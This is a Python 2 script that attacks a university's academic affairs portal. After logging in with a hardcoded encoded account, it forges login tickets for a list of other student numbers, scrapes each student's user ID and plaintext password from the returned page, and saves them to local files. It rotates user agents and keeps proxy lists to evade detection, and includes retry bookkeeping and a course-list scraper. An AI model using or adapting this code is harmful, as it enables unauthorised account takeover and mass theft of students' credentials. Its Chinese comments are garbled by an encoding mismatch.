# -*- coding: cp936 -*-
from __future__ import unicode_literals
import urllib2
import urllib
import HTMLParser  
import urlparse  
import cookielib  
import string  
import re
import time
import math
import os
import json
import xlwt
import sys
import threading
import copy
import random


userAgents = ['Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
              'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
              'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
              'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11',
              'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13',
              'Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11',
              'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
              'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25']


proxyList = [{}]

password = []



#��¼��ȡ�����õ��߳���
class ThreadForLogin (threading.Thread):
    def __init__(self,name,delay,stuNumber,stuRandom,url):
        super(ThreadForLogin,self).__init__()
        self.delay = delay
        self.name = name
        self.stuNumber = copy.copy(stuNumber)
        self.stuRandom = stuRandom
        self.url = url


    def run(self):
        print 'This is '+self.name
        time.sleep(self.delay)
        for i in self.stuNumber:
            print 'Start '+i+'...'
            #passWordOpener JustForTest
            opener = passWordOpener(i,self.stuRandom,self.url)

            if saveInfo(opener,self.name,self.url):
                print 'Get '+i+' Success'
            else:
                print 'Get '+i+' Fail'
            pauseSomeTime(i)

#�ӳ�ʱ��
def pauseSomeTime(stuNumber):
    print 'Now is '+stuNumber+'\'s PauseTime'
    time.sleep(5)
    print ''+stuNumber+'\'s PauseTime Over'

#�ӱ��ػ��ѧ��
#����ѧ�Ź��ɵ�List
def getStuNumber():
    #UserInfo.txt
    #PassWordInfoOther.txt
    f = open("e:\\UserFromSystem\\PassWordInfoOther.txt","r")
    lines = f.readlines()
    stuNumberArray = []
    for line in lines:
        stuNumber = line[0:9]
        stuNumberArray.append(stuNumber)

    print 'Get StuNumber From LocalSystem Success'
    f.close()
    return stuNumberArray

#�ӱ����ļ����ȡ���õ�ip����ʽ��
def getIP():
    global proxyList
    f = open('e:\\UserFromSystem\\ip\\ip.txt','r')
    lines = f.readlines()
    for line in lines:
        #print line
        ip = "http://"+line.split('\t')[0]+':'+line.split('\t')[-1]
        ip = ip[0:-1]
        #print ip
        proxyList.append({'http':ip})

    #proxyList.append({})
    print 'Get Match From IP.txt Success'
    f.close()
    

#���ɸ�8λ�������
def getRandom():
    return str(random.randrange(10000000,99999999))

#��ʼ���߳���ȡ����
def getPassWordFromSystem(url):
    Threads = []
    stuNumberArray = div_list(getStuNumber(),1)
    thread1 = ThreadForLogin('Thread1',0,stuNumberArray[0],getRandom(),url)
    #thread2 = ThreadForLogin('Thread2',1,stuNumberArray[1],getRandom(),url)
    #thread3 = ThreadForLogin('Thread3',2,stuNumberArray[2],getRandom(),url)

    thread1.start()
    #thread2.start()
    #thread3.start()

    Threads.append(thread1)
    #Threads.append(thread2)
    #Threads.append(thread3)

    for t in Threads:
        t.join()
    print 'All Thread Has Refuse!Now Main Thread Exit!'

#�ָ�List
def div_list(ls,n):
    if not isinstance(ls,list) or not isinstance(n,int):  
        return []  
    ls_len = len(ls)  
    if n<=0 or 0==ls_len:  
        return []  
    if n > ls_len:  
        return []  
    elif n == ls_len:  
        return [[i] for i in ls]  
    else:  
        j = ls_len/n  
        k = ls_len%n  
        ### j,j,j,...(ǰ����n-1��j),j+k  
        #����j,����n-1  
        ls_return = []  
        for i in xrange(0,(n-1)*j,j):  
            ls_return.append(ls[i:i+j])  
        #����ĩβ��j+k  
        ls_return.append(ls[(n-1)*j:])  
        return ls_return


#�����½

def loginToSys(code,now):
    #��¼����ҳ��  
    #hosturl = 'http://jwxt.gduf.edu.cn' 
    #post���ݽ��պʹ����ҳ��  
    posturl = 'http://jwxt.gduf.edu.cn/jsxsd/xk/LoginToXk' 
      
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()  
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.adddeaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'),
                         ('Referer' , 'http://jwxt.gduf.edu.cn/jsxsd/')]
    #���������
    #Inp(ѧ��)+%%%+Inp(����)
    postData = {'encoded':code}
    #����POST����
    postData = urllib.urlencode(postData)
    #����ҳPOST���ݲ�Я��cookie
    op = opener.open(posturl,postData)
    print op.read()
    print 'Login to System Success'
    
    #ץȡ�������˺�����
    #saveInfo(opener)

    
    #ѡ�� 
    ccUrl = getClassChooseUrl(opener)
    #print ccUrl
    #if goToChooseClass(opener,ccUrl):
    #    opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxkkc/comeInGgxxkxk')
    #    ccJsonParse(poToUrl(opener,1),now)
    #return data

#ץȡģ���¼ ���ص���opener
def passWordOpener(stuNumber,ticket,url):
    global userAgent
    #218.107.50.221
    #218.107.50.218
    if url.strip()=='':
    	url='jwxt.gduf.edu.cn'
    posturl = 'http://jwxt.gduf.edu.cn/Logon.do?method=logonFromJsxsd/' 

    #�Ӵ���IP�б������ѡһ����Ϊ����IP
    #proxyListΪһ�� **ȫ��List
    proxyIP = random.choice(proxyList)
    print proxyIP
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()  
    #�������userAgents�б������ѡȡһ����Ϊ�����UA
    ua_temp = random.choice(userAgents)
    #�Դ���IP��Cookie����������һ��opener
    #urllib2.ProxyHandler(proxies=proxyIP),
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.addheaders = [('User-Agent', ua_temp),
                         ('Referer' , 'http://jwxt.gduf.edu.cn/jsxsd/framework/xsMain.jsp'),
                         ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
                         ('Accept-Encoding','gzip, deflate'),
                         ('Accept-Language','zh-CN,zh;q=0.8'),
                         ('Connection','Keep-alive'),
                         ('Host','jwxt.gduf.edu.cn'),
                         ('Content-Length','55'),
                         ('Cache-Control','max-age=0'),
                         ('Origin','http://jwxt.gduf.edu.cn'),
                         ('Upgrade-Insecure-Requests','1'),
                         ('Content-Type','application/x-www-form-urlencoded')]

    postData = {'encoded':'MTUxNTQzMjE1%%%aW5zcGVlZDU1'}
    postData = urllib.urlencode(postData)

    response = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xk/LoginToXk',postData)
    #print response.geturl()
    #print response.read()
    #���������
    postData = {'view':'',
                'useraccount':stuNumber,
                'ticket':stuNumber+'#'+ticket}
    #����POST����
    postData = urllib.urlencode(postData)
    #����ҳPOST���ݲ�Я��cookie
    response = opener.open(posturl,postData)
    
    #reUrl = response.geturl()
    
    #print response.read()
    data = response.read()
    #return response
    #print data
    print response.geturl()
    return data


#��ȡѡ������
def getClassChooseUrl(opener):
    op = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxk/xklc_list')
    data = op.read()
    #����ɸѡ������
    pattern = re.compile(r'<a href="(.+?)">',re.S)
    ccUrl = re.findall(pattern,data)
    #������һ������ Ҳ���ǽ���ѡ�ε�����
    #�Զ����׺ƥ��
    return ccUrl[len(ccUrl)-1]+'_fuckyou'


#����������תѡ��ҳ��
def goToChooseClass(opener,ccUrl):
    pattern = re.compile(r'\/jsxsd\/xsxk\/xklc_view\?jx0502zbid=(.+?)_fuckyou',re.S)
    url = re.findall(pattern,ccUrl)
    print url
    if len(url):   
        op = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xsxk/xsxk_index?jx0502zbid='+url[0])
        #data = op.read()
        print 'success'
        return True
    else:
        print 'fail'
        return False



#�����ʺ�����
#������ӵ�и�ѧ�ŵ�¼��cookie��opener���߳����
#���߳���������ļ��������߳���
def saveInfo(data,threadNumber,url):
    #if url.strip()=='':
    #    url = 'jwxt.gduf.edu.cn'
    #data = response.read()
    #print response.info()
    #print data
    
    if not os.path.exists('e:/UserFromSystem/'):
        os.mkdir(r'e:/UserFromSystem/')

    f = open("e:\\UserFromSystem\\PassWordInfo"+threadNumber+".txt","a+")
        
    if data.strip()=='':
        f.close()
        print 'Log to System Fail'
        return False
    else:
        userid = getUserId(data)
        userpwd = getPassWord(data)
        #print userid
        #print userpwd
        if not (userid.strip()=='' and userpwd.strip()==''):
            f.write(userid)
            f.write('    ')
            f.write(userpwd)
            f.write('\n')
            f.close()
            print "Get "+userid+" Save Success"
            return True
        else:
            print 'Get '+userid+' Fail'
            f.close()
            return False
    
            

#��ȡ����
def getPassWord(data):
    #print data
    pattern = re.compile(r"var userpsw = '(.+?)';",re.S)
    userpwd = re.findall(pattern,data)
    
    #print userpwd[0]
    if len(userpwd)==0:
        return ''
    
    if userpwd:
        return userpwd[0]
    else:
        return ''

#��ȡ�˺�
def getUserId(data):
    #print data
    pattern = re.compile(r"var userid = '(.+?)';",re.S)
    userid = re.findall(pattern,data)

    #print userid
    #print type(userid)
    if len(userid)==0:
        return ''
    if userid:
        return userid[0]
    else:
        return ''


#�˺�������뺯��
def encodeInp(input):
    keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    output = ""
    chr1, chr2, chr3 = "","",""
    enc1, enc2, enc3, enc4 = "","","",""
    i = 0
    while True:
        if i<len(input):
            chr1 = ord(input[i])
            i+=1
        if i<len(input):
            chr2 = ord(input[i])
            i+=1
        if i<len(input):   
            chr3 = ord(input[i])
            i+=1

        enc1 = chr1 >> 2
        
        if not chr2=='':
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4)
        else:
            enc2 = ((chr1 & 3) << 4)

        if not chr2=='':
            if not chr3=='':
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6)
                enc4 = chr3 & 63
            else:
                enc3 = ((chr2 & 15) << 2)
                
        if not chr2=='':
            if math.isnan(chr2):
                enc3 = enc4 = 64
        else:
            enc3 = enc4 = 64
        if not chr3=='':
            if math.isnan(chr3):
                enc4 = 64
        else:
            enc4 = 64
        output = output + chr(ord(keyStr[enc1])) + chr(ord(keyStr[enc2])) + chr(ord(keyStr[enc3])) + chr(ord(keyStr[enc4]))
        chr1 = chr2 = chr3 = ""
        enc1 = enc2 = enc3 = enc4 = ""
        if i >= len(input):
            break
    return output


#��γ�
#����Json
def poToUrl(opener,echo):
    #����һ��Ҫ�ύ����������(�ֵ�)
    data = {}
    data['sEcho'] = echo
    data['iColumns'] = '12'
    data['sColumns'] = ''
    data['iDisplayStart'] = 0
    data['iDisplayLength'] = 177
    data['mDataProp_0'] = 'kch'
    data['mDataProp_1'] = 'kcmc'
    data['mDataProp_2'] = 'xf'
    data['mDataProp_3'] = 'skls'
    data['mDataProp_4'] = 'sksj'
    data['mDataProp_5'] = 'skdd'
    data['mDataProp_6'] = 'xqmc'
    data['mDataProp_7'] = 'xkrs'
    data['mDataProp_8'] = 'syrs'
    data['mDataProp_9'] = 'ctsm'
    data['mDataProp_10'] = 'szkcflmc'
    data['mDataProp_11'] = 'czOper'

     
    #����post�ĵ�ַ
    url = 'http://jwxt.gduf.edu.cn/jsxsd/xsxkkc/xsxkGgxxkxk?kcxx=&skls=&skxq=&skjc=&sfym=false&sfct=false&szjylb=&sfxx=false'
    post_data = urllib.urlencode(data)
     
    #�ύ����������
    req = opener.open(url, post_data)
     
    #��ȡ�ύ�󷵻ص���Ϣ
    content = req.read()
    classInfoJson = json.loads(content)
    #�ᱬջ
    #print classInfoJson
    return classInfoJson

#����γ���Ϣ
#����ΪPOST�γ�����󷵻ص�JSON,������ļ�����
def ccJsonParse(json,now):
    if not os.path.exists('e:/ClassData/'):
        os.mkdir(r'e:/ClassData/')
    if os.path.exists('e:/ClassData/'+now+'.xls'):
        os.remove('e:/ClassData/'+now+'.xls')
    kch = '�γ̺�'
    jx0404id = 'jx0404id'
    skls = '�Ͽ���ʦ'
    sksj = '�Ͽ�ʱ��'
    skdd = '�Ͽεص�'
    kcmc = '�γ�����'
    cfbs = 'δ֪Ҫ��-cfbs-null'
    xf = 'ѧ��'
    syrs = 'ʣ������'
    book = xlwt.Workbook(encoding='utf-8',style_compression=0)
    sheet = book.add_sheet('ClassInfo1',cell_overwrite_ok=True)
    
    sheet.write(0,0,kch.decode('gbk'))
    sheet.write(0,1,jx0404id.decode('gbk'))
    sheet.write(0,2,cfbs.decode('gbk'))
    sheet.write(0,3,xf.decode('gbk'))
    sheet.write(0,4,kcmc.decode('gbk'))
    sheet.write(0,5,skls.decode('gbk'))
    sheet.write(0,6,skdd.decode('gbk'))
    sheet.write(0,7,sksj.decode('gbk'))
    sheet.write(0,8,syrs.decode('gbk'))

    for i in range(0,json['iTotalRecords']):
        sheet.write(i+1,0,json['aaData'][i]['kch'])
        sheet.write(i+1,1,json['aaData'][i]['jx0404id'])
        sheet.write(i+1,2,'null')
        sheet.write(i+1,3,json['aaData'][i]['xf'])
        sheet.write(i+1,4,json['aaData'][i]['kcmc'])
        sheet.write(i+1,5,json['aaData'][i]['skls'])
        sheet.write(i+1,6,json['aaData'][i]['skdd'])
        sheet.write(i+1,7,json['aaData'][i]['sksj'])
        sheet.write(i+1,8,json['aaData'][i]['syrs'])

    book.save('e:\\ClassData\\'+now+'.xls')
    print 'Save ClassData Success'

def JustForTest(stuNumber,ticket,url):
    posturl = 'http://jwxt.gduf.edu.cn/Logon.do?method=logonFromJsxsd' 

    #�Ӵ���IP�б������ѡһ����Ϊ����IP
    #proxyListΪһ�� **ȫ��List
    #proxyIP = random.choice(proxyList)
    #����һ��cookie��������������ӷ���������cookie�����أ������ڷ�������ʱ���ϱ��ص�cookie  
    cj = cookielib.CookieJar()
    
    #cookieFile = "cookieFile.txt"
    #cookieJar = cookielib.MozillaCookieJar(cookieFile)
    #cookieJar.save()
    
    proxyIP = random.choice(proxyList)
    #print proxyIP
    #�������userAgents�б������ѡȡһ����Ϊ�����UA
    ua_temp = random.choice(userAgents)
    #print ua_temp
    #�Դ���IP��Cookie����������һ��opener
    #urllib2.ProxyHandler(proxies=proxyIP),
    #,urllib2.ProxyHandler(proxies=proxyIP), urllib2.HTTPHandler
    #
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.HTTPHandler)
    # ����ͷ�ļ�αװ�����
    opener.addheaders = [('User-Agent', ua_temp),
                         ('Referer' , 'http://jwxt.gduf.edu.cn/jsxsd/framework/xsMain.jsp'),
                         ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
                         ('Accept-Encoding','gzip, deflate'),
                         ('Accept-Language','zh-CN,zh;q=0.8'),
                         ('Connection','Keep-alive'),
                         ('Host','jwxt.gduf.edu.cn'),
                         ('Content-Length','55'),
                         ('Cache-Control','max-age=0'),
                         ('Origin','http://jwxt.gduf.edu.cn'),
                         ('Upgrade-Insecure-Requests','1'),
                         ('Content-Type','application/x-www-form-urlencoded')]

    #urllib2.install_opener(opener)
    #passWordTemp = random.choice(password)
    #
    postData = {'encoded':'MTUxNTQzMjE1%%%aW5zcGVlZDU1'}
    postData = urllib.urlencode(postData)

    response = opener.open('http://jwxt.gduf.edu.cn/jsxsd/xk/LoginToXk',postData)
    time.sleep(1)
    #print response.geturl()
    #print response.read()
    #���������
    postData = {'view':'',
                'useraccount':stuNumber,
                'ticket':stuNumber+'#'+ticket}
    #����POST����
    postData = urllib.urlencode(postData)
    #req = urllib2.Request(
    #    url = posturl,
    #    data = postData
    #)
    #����ҳPOST���ݲ�Я��cookie
    #print '1'
    
    #response = opener.open(req)
    response = opener.open(posturl,postData)
    #cookieJar.save()
    #print response.geturl()
    reUrl = response.geturl()
    #response = opener.open("http://jwxt.gduf.edu.cn/jsxsd/framework/xsMain.jsp")
    #time.sleep(1)
    #print '1'
    #response = opener.open(reUrl)
    data = response.read()
    #print len(cj)
    #for item in cj:
        #print 'Cookie:Name='+item.name
        #print 'Cookie:Value='+item.value
    #print data
    return data

def FindGetted():
    f = open("e:\\UserFromSystem\\PassWordInfo.txt","r")
    lines = f.readlines()
    stuNumberArray = []
    for line in lines:
        stuNumber = line[0:9]
        stuNumberArray.append(stuNumber)

    #print 'Get StuNumber From LocalSystem Success'
    f.close()
    return stuNumberArray

def FindAll():
    f = open("e:\\UserFromSystem\\UserInfoAlpha.txt","r")
    lines = f.readlines()
    stuNumberArray = []
    for line in lines:
        stuNumber = line[0:9]
        stuNumberArray.append(stuNumber)

    #print 'Get StuNumber From LocalSystem Success'
    f.close()
    return stuNumberArray

def ReTry(array1,array2):
    array = []
    for i in array2:
        if i not in array1:
            array.append(i)

    f = open("e:\\UserFromSystem\\PassWordInfoOther.txt","a+")
    for i in array:
        f.write(i)
        f.write('\n')
    f.close()

def ReTryGetted():
    array1 = FindGetted()
    print len(array1)
    f = open("e:\\UserFromSystem\\UserInfoAlpha.txt","r")
    lines = f.readlines()
    stuNumberArray = []
    stuNameArray = []
    for line in lines:
        stuNumber = line[0:9]
        stuName = line.split("\t")[-1]
        stuNumberArray.append(stuNumber)
        stuNameArray.append(stuName)
    array2 = [stuNumberArray,stuNameArray]
    print len(array2[0])

    array = [[],[]]
    for i in array2[0]:
        if i.upper() in array1:
            array[0].append(i)
            array[1].append(stuNameArray[stuNumberArray.index(i)])
    print len(array1)==len(array[0])
    print len(array[0])
    fi = open("e:\\UserFromSystem\\Getted.txt","a+")
    for i in range(len(array[0])):
        #fi.write(array[0][i])
        #fi.write("\t")
        fi.write(array[1][i])
        #fi.write("\n")

    fi.close()
    f.close()

#class HttpRedirect_Handler(urllib2.HTTPRedirectHandler):
#    def http_error_302(self, req, fp, code, msg, headers):
#        pass

def getPassWordInfoFromPassWord():
    stuNumber = []
    stuPassWord = []
    passWordInfo = [stuNumber,stuPassWord]

    f = open('e:\\UserFromSystem\\PassWordInfo.txt','r')
    sizehint = 1024
    while 1:
        lines = f.readlines(sizehint)
        if not lines:
                print '��ȡ���'
                break
        for line in lines:
            stuNumber.append(line.split(' ')[0])
            stuPassWord.append(line.split(' ')[-1])
    return passWordInfo

def getPassWord(passWordInfo):
    global password
    for i in range(len(passWordInfo[0])):
        password.append(encodeInp(passWordInfo[0][i])+"%%%"+encodeInp(passWordInfo[1][i]))

if __name__ == "__main__":
    #getIP()
    #print 'Get IP Success'
    #time.sleep(2)
    #getPassWord(getPassWordInfoFromPassWord())
    getPassWordFromSystem('')
    #JustForTest('151543216','000000','')
    #ReTry(FindGetted(),FindAll())
    #ReTryGetted()
    
    print 'main success'
